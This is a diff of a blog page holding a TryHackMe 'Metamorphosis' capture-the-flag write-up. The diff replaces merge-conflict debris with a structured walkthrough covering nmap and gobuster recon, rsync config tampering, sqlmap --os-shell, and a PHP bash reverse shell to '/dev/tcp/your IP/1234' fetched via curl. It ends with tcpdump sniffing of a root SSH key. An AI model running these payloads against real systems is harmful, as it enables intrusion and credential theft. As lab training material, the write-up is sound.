@@ -200,9 +200,29 @@
                 post-container">
 
                 
+                <header>
+                    <h2>Contents</h2>
+                </header>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#visting-webpage">Visting Webpage</a></li>
+        <li><a href="#rsync-enumeration">Rsync Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#sqlmap">SQLmap</a></li>
+    <li><a href="#getting-reverse-shell">Getting Reverse Shell</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+                
                 <h2 id="overview">Overview</h2>
-<p>##Inital Recon</p>
-<p>First we start with the basic nmap scan</p>
+<p><img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>##Recon</p>
+<h3 id="nmap">Nmap</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
 Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-08-12 11:32 IST
 Nmap scan report <span style="color:#66d9ef">for</span> 10.10.97.133 <span style="color:#f92672">(</span>10.10.97.133<span style="color:#f92672">)</span>
@@ -246,7 +266,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.22 seconds
 
-</code></pre></div><p>##Gobuster</p>
+</code></pre></div><h3 id="gobuster">Gobuster</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
 <span style="color:#f92672">===============================================================</span>
@@ -269,35 +289,19 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 /inde.html            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>                               
 Progress: <span style="color:#ae81ff">56672</span> / <span style="color:#ae81ff">882244</span> <span style="color:#f92672">(</span>6.42%<span style="color:#f92672">)</span>               
 
-</code></pre></div><p>##Visting Webpage</p>
+</code></pre></div><h3 id="visting-webpage">Visting Webpage</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.97.133/admin
-<span style="color:#f92672">&lt;&lt;&lt;&lt;&lt;&lt;</span>&lt; HEAD
 
-</code></pre></div><p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+</code></pre></div><p><img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>Viewing <code>source code</code></p>
-<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<p>##Rsync Enumeration</p>
+<p><img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<h3 id="rsync-enumeration">Rsync Enumeration</h3>
 <p>We have port 873 running which is <code>Rsync</code> you can read more about this here<a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
-<p>=======</p>
-<pre><code>
-&lt;img style=&quot;border:2px solid black&quot; src=&quot;/images/My_New_Hugo_Site.png&quot; align=&quot;left&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
-
-
-Viewing `source code` 
-
-&lt;img style=&quot;border:2px solid black&quot; src=&quot;/images/My_New_Hugo_Site.png&quot; align=&quot;left&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
-
-##Rsync Enumeration
-
-We have port 873 running which is `Rsync` you can read more about this here[hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
-
-&gt;&gt;&gt;&gt;&gt;&gt;&gt; 851a5582408dd1b3b28c829852ad6b894439a2e3
-```bash
-rsync -rdt rsync://10.10.38.244:873
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873
 
 we get | Conf            All Confs |
 
-</code></pre><p>Listing content of <code>Conf</code></p>
+</code></pre></div><p>Listing content of <code>Conf</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 rsync -rdt rsync://10.10.38.244:873/Conf
 drwxrwxrwx          4,096 2021/04/11 01:33:08 .
@@ -331,36 +335,41 @@ Local <span style="color:#f92672">=</span> No
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  
 
-</code></pre></div><p>&laquo;&laquo;&laquo;&lt; HEAD</p>
-<p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
-<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<p>Use <code>brupsuite</code> and saving the request as <code>req.txt</code> file</p>
-<p>##SQLmap</p>
-<p>=======</p>
-<p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
-<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
-<p>Use <code>brupsuite</code> and saving the request as <code>req.txt</code> file</p>
-<p>##SQLmap</p>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<p>851a5582408dd1b3b28c829852ad6b894439a2e3
-use sqlmap <code>batch mode</code> so that it doesn&rsquo;t ask for inputs and <code>os-shell</code> to get the shell.</p>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
+</code></pre></div><p>Going to the admin page again  <code>http://10.10.101.93/admin/</code></p>
+<p><img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Use <code>brupsuite</code> and save the request as <code>req.txt</code> file</p>
+<h2 id="sqlmap">SQLmap</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r req.txt --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
 
-</code></pre></div><p>we get permission denied when try to run these command ..
-and it is confirm the tcp dump was running using linpeas..</p>
+</code></pre></div><p><img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<h2 id="getting-reverse-shell">Getting Reverse Shell</h2>
+<p>Using curl to upload the <code>Shell.php</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/tryhackme/metamorphosis#cat shell.php
+
+&lt;?php
+exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/your IP/1234 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>;
+</code></pre></div><p>In Os-shell
+curl http://your IP/shell.php -o shell.php</p>
+<p>access the shell.php in browser using <code>http://10.10.101.93/shell.php/</code></p>
+<p>and <code>nc -lnvp 1234</code> in other terminal</p>
+<p>we get the <code>Rev shell</code>.</p>
+<p><img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Getting  <code>User.txt</code></p>
+<p><img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running <code>linpeas</code> we get the user can run <code>Tcpdump</code></p>
+<p>Running <code>Pspy64</code> we get</p>
+<p><img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>It shows root runnign req.sh but we can run this in terminal ..</p>
+<p>Now finally run tcpdump in one terminal and pspy64 in other &hellip; and capture the output using wget &hellip;&hellip;&hellip;&hellip;&hellip;</p>
+<p><img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/pspy2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>In local machine run `wget http://machine Ip/1.pcap</p>
+<p>Open 1.pcap file in <code>Wireshark</code></p>
+<p>follow tcp stream and get the SSH key</p>
+<p><img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>log in with key and get <code>root.txt</code></p>
+<p><img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 
 
                 
